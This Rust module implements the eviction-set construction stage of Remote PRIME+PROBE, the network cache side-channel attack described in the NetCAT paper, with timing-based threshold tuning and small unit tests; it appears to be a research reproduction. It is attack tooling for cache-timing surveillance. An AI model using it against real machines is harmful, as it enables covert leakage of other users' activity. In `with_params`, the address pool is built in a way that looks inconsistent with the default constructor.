//! # Remote PRIME+PROBE
//! This module is responsible for implementing PRIME+PROBE method of cache activity tracking.
//! The method is described in _NetCAT: Practical Cache Attacks from the Network_.

#![allow(dead_code)]
use crate::connection::{MemoryConnector, Time};
use hdrhistogram::Histogram;
use rand;
use std::cmp::min;
use std::collections::{HashMap, HashSet};
use std::io::Result;
use std::io::{Error, ErrorKind};

pub const NUM_OF_SETS: usize = 64;
pub const BUFF_LEN: usize = 8_388_608; // 8 MiB
pub const BYTES_PER_LINE: usize = 64;
pub const LINES_PER_SET: usize = 12;
pub const THRESHOLD: Time = 260;
pub const DELTA: usize = 30;
pub const INSERT_RATE: usize = 100;
pub const TIMINGS_INIT_FILL: usize = 1000;
pub const PERCENTILE: f64 = 60.0;

type Address = usize;
type Contents = u8;

#[macro_export]
macro_rules! median {
    ($blk:block) => {{
        const STABILIZE_CNT: usize = 10;
        let mut vec = Vec::with_capacity(STABILIZE_CNT);
        for _ in 0..STABILIZE_CNT {
            vec.push($blk);
        }
        println!("{:?}", vec);
        vec.sort();
        vec[(vec.len() - 1) / 2]
    }};
}

/// # EvictionSet
/// EvictionSet
type EvictionSet = HashSet<Address>;

/// # Params
/// Parameters for Remote PRIME+PROBE.
#[derive(Clone, Copy)]
pub struct Params {
    num_of_sets: usize,
    buff_len: usize,
    bytes_per_line: usize,
    lines_per_set: usize,
    threshold: Time,
}

impl Params {
    pub fn new(
        num_of_sets: usize,
        buff_len: usize,
        bytes_per_line: usize,
        lines_per_set: usize,
        threshold: Time,
    ) -> Params {
        Params {
            num_of_sets,
            buff_len,
            bytes_per_line,
            lines_per_set,
            threshold,
        }
    }
}

/// # RPP
/// Contains the context of the RPP for a given connection.
pub struct RPP {
    params: Params,
    conn: Box<dyn MemoryConnector<Item = Contents>>,
    sets: Vec<EvictionSet>,
    addrs: HashSet<Address>,
    timings: Histogram<u64>, // we will be using this to dynamically scale threshold
}

impl RPP {
    pub fn new(conn: Box<dyn MemoryConnector<Item = Contents>>) -> RPP {
        let hist = Histogram::new(5).expect("could not create hist"); // 5 sets the precision and it is the maximum possible
        let mut rpp = RPP {
            params: Params::new(
                NUM_OF_SETS,
                BUFF_LEN,
                BYTES_PER_LINE,
                LINES_PER_SET,
                THRESHOLD,
            ),
            conn,
            sets: Vec::with_capacity(NUM_OF_SETS),
            addrs: (0usize..BUFF_LEN).step_by(BYTES_PER_LINE).collect(),
            timings: hist,
        };
        rpp.build_sets();

        rpp
    }

    pub fn with_params(conn: Box<dyn MemoryConnector<Item = Contents>>, params: Params) -> RPP {
        let hist = Histogram::new(5).expect("could not create hist"); // 5 sets the precision and it is the maximum possible

        let mut rpp = RPP {
            params,
            conn,
            sets: Vec::with_capacity(params.num_of_sets),
            addrs: (0usize..params.num_of_sets)
                .step_by(params.lines_per_set)
                .collect(),
            timings: hist,
        };

        rpp.fill_hist();
        rpp.build_sets();

        rpp
    }

    fn fill_hist(&mut self) {
        use rand::seq::IteratorRandom;
        // we assume that the memory region is not cached
        let mut rng = rand::thread_rng();

        for ofs in self
            .addrs
            .iter()
            .copied()
            .choose_multiple(&mut rng, TIMINGS_INIT_FILL)
        {
            // here we read from the main memory
            let (_, t1) = self.conn.read_timed(ofs).expect("Could not read in hist");

            // here we fist write the value to cache it and read again from cache
            self.cache(ofs).expect("Could not write for hist");
            let (_, t2) = self.conn.read_timed(ofs).expect("Could not read in hist");

            // we expect the latency from main memory to be bigger that from LLC
            if t1 < t2 {
                continue;
            }

            let hit_miss = t1 - t2;
            self.timings.record(hit_miss).expect("Could not fill hist");
        }
    }

    fn threshold(&self) -> Time {
        self.timings.value_at_percentile(PERCENTILE)
    }

    fn record(&mut self, val: Time) {
        self.timings
            .record(val)
            .expect("Failed to record new timing");
    }

    fn record_n(&mut self, val: Time, n: u64) {
        self.timings
            .record_n(val, n)
            .expect("Failed to record new timing");
    }

    // allocates new way in cache (read for local, write for DDIO)
    #[cfg(not(feature = "local"))]
    fn cache(&mut self, x: usize) -> Result<()> {
        self.conn.write(x, &rand::random())
    }

    #[cfg(feature = "local")]
    fn cache(&mut self, x: usize) -> Result<()> {
        self.conn.read(x)?;
        Ok(())
    }

    // alocates cache lines for all iterator values, which might cause eviction
    #[cfg(not(feature = "local"))]
    fn evict<I: Iterator<Item = Address>>(&mut self, it: I) -> Result<()> {
        for x in it {
            self.conn.write(x, &rand::random())?;
        }

        Ok(())
    }

    #[cfg(feature = "local")]
    fn evict<I: Iterator<Item = Address>>(&mut self, it: I) -> Result<()> {
        for x in it {
            self.conn.read(x)?;
        }

        Ok(())
    }

    fn build_sets(&mut self) {
        self.conn.allocate(self.params.buff_len);
        self.fill_hist();

        while let Err(e) = self.build_set() {
            println!("{}", e);
        }
    }

    // note that this step might fail only due to read & write fails. read and write fail only as the last resort
    pub fn build_set(&mut self) -> Result<Box<EvictionSet>> {
        let (mut s, x) = self.forward_selection()?;
        self.backward_selection(&mut s, x)?;
        self.cleanup(&s)?;

        Ok(s)
    }

    fn forward_selection(&mut self) -> Result<(Box<EvictionSet>, Address)> {
        let mut n = self.params.lines_per_set + 1;
        // We expect to have this much elems in the resulting set
        let mut latencies = HashMap::with_capacity(self.params.buff_len / 4);

        loop {
            let mut sub_set: EvictionSet = self.addrs.iter().take(n).copied().collect();
            // First, we write the whole buffer. Some addrs might get evicted by the consequent writes.
            // If this fails, then repeating won't help
            self.evict(sub_set.iter().copied())?;

            // Measure access time for all entries of a selected subset
            for addr in sub_set.iter() {
                let (_, lat) = self.conn.read_timed(*addr)?;
                latencies.insert(*addr, lat);
            }

            // Now we find an address with the highest access time
            let x = *latencies.iter().max_by_key(|(_, &v)| v).unwrap().0; // Take the key from the pair (which is an address with the biggest latency)

            // Measure cache hit time for x
            self.cache(x)?;
            let t1 = self.conn.read_timed(x)?.1;

            // Potentially take x from the main memory
            sub_set.remove(&x);
            self.evict(sub_set.iter().copied())?;
            let t2 = self.conn.read_timed(x)?.1;

            // Both t1 and t2 are from cache
            if t1 > t2 {
                continue;
            }
            // Determine if x got evicted from the cache by this set
            let diff = t2 - t1;
            if diff > self.threshold() {
                self.record_n(diff, (n / INSERT_RATE) as u64);
                return Ok((Box::new(sub_set), x));
            }

            n += 1;
            if n % INSERT_RATE == 0 {
                self.record(diff);
            }
        }
    }

    // Here we assume that set `s` truly evicts address `x`
    fn backward_selection(&mut self, s: &mut EvictionSet, x: Address) -> Result<()> {
        if s.len() < self.params.lines_per_set {
            return Err(Error::new(
                ErrorKind::Other,
                "ERROR: the initial set for backwards selection is too narrow.",
            ));
        } else if s.len() == self.params.lines_per_set {
            return Ok(());
        }

        // we may begin by trying to remove part of the overhead. If we fail, the trying less in ok
        let mut n = 1;
        let mut i = 0;
        let mut last_i = 0;
        loop {
            i += 1;
            if s.len() < self.params.lines_per_set {
                return Err(Error::new(
                    ErrorKind::Other,
                    "ERROR: Set shrunk too much during backwards selection",
                ));
            }

            // if S is relatively small, then we do not use step adjusting
            n = if s.len() <= self.params.lines_per_set + DELTA {
                1
            } else {
                min(n, s.len() / 2)
            };

            let s_rm: EvictionSet = s.iter().take(n).copied().collect();

            // Measure cache hit time for x
            self.cache(x)?;
            let t1 = self.conn.read_timed(x)?.1;

            // Potentially read x from the main memory
            self.evict(s.difference(&s_rm).copied())?;
            let t2 = self.conn.read_timed(x)?.1;

            // Both t1 and t2 are from cache
            if t1 > t2 {
                continue;
            }

            // Determine if `x` got evicted by a reduced set S\S_rm
            let diff = t2 - t1;
            if diff > self.threshold() {
                self.record_n(diff, ((i - last_i) / INSERT_RATE) as u64);
                last_i = i;
                // Truly remove S_rm from S
                s.retain(|x| !s_rm.contains(x));
                // During the next step we will try to remove 10 more addrs
                n += 10;
            } else {
                if i % INSERT_RATE == 0 {
                    self.record(diff);
                }
                // We removed too much
                n -= 1;
            }

            // Stop when the size of the set equals the size of a cache set
            if s.len() == self.params.lines_per_set {
                return Ok(());
            }
        }
    }

    fn cleanup(&mut self, s: &EvictionSet) -> Result<()> {
        // First we remove addr in set `S` from global addr pool
        self.addrs.retain(|x| !s.contains(x));
        // We will be iterating over the set and removing from it. Rust does not allow that, thus making a copy
        let addrs: HashSet<usize> = self.addrs.iter().copied().collect();
        let mut last_i = 0;
        for (i, x) in addrs.into_iter().enumerate() {
            // measure x hit time
            self.cache(x)?;
            let t1 = self.conn.read_timed(x)?.1;

            // potentially read x from the main memory
            self.evict(&mut s.iter().copied())?;
            let t2 = self.conn.read_timed(x)?.1;

            // Both t1 and t2 are from cache
            if t1 > t2 {
                continue;
            }

            // We evicted x? Then we do not need it anymore
            let diff = t2 - t1;
            if diff > self.threshold() {
                self.record_n(diff, ((i - last_i) / INSERT_RATE) as u64);
                last_i = i;
                self.addrs.remove(&x);
            } else if i % INSERT_RATE == 0 {
                self.record(diff);
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn new_rpp_test() {
        let conn = Box::new(crate::connection::local::LocalMemoryConnector::new());
        super::RPP::new(conn);
    }

    #[test]
    fn macro_test() {
        let med = median! {
            {
                1
            }
        };
        assert_eq!(1, med, "Median from const failed");

        let v = vec![1, 2, 4, 5, 6, 324, 22, 3, 10, 13]; // 1, 2, 3, 4, 5, 6, 10, 13, 22, 324
        let mut it = v.into_iter();

        let med = median! {{
            it.next().unwrap()
        }};
        assert_eq!(5, med, "Median from even iter failed");

        let v = vec![1, 2, 4, 5, 6, 324, 22, 3, 10, 13, 0];
        let mut it = v.into_iter();

        let med = median! {{
            it.next().unwrap()
        }};
        assert_eq!(5, med, "Median from odd iter failed");
    }
}
